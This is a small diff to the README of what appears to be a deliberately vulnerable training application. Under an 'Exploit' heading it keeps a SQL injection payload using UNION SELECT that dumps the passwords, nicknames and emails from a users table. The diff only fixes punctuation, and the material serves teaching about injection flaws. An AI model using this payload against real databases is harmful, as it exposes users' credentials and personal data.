@@ -32,7 +32,7 @@ The application is then accessible on [http://localhost:8080/](http://localhost:
 
 ## Exploit
 
-Here is an example of a working payload, esposing all passwords in the table :
+Here is an example of a working payload, esposing all passwords in the table:
 
 ```sql
 nothing%" UNION SELECT pass, nickname, email FROM users#
